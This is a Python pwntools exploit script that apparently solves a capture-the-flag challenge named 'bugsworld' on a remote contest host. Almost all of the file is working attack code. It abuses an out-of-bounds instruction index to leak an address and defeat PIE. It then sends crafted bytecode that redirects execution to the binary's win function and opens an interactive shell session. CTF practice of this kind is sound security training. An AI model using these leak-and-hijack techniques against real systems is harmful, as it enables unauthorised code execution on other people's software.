#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.pwnoh.io --port 13382 bugsworld
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bugsworld')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.pwnoh.io'
port = int(args.PORT or 13382)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br *run_program+586
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
JUMP = 6

def send_prog(instructions):
    io.sendlineafter(b"> ",str(len(instructions)).encode())
    io.sendlineafter(b"> ",b" ".join([str(i).encode() for i in instructions]))
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
send_prog([(exe.sym.instruction_table - exe.sym.instruction_names)//32])
leak = unpack(io.recv(6),'all')
log.info(hex(leak))
exe.address = leak - exe.sym.do_move
log.info(hex(exe.address))
send_prog([JUMP, 3, JUMP, (exe.sym.bytecode+5*8 - exe.sym.instruction_table)//8, JUMP,exe.sym.win])
io.interactive()
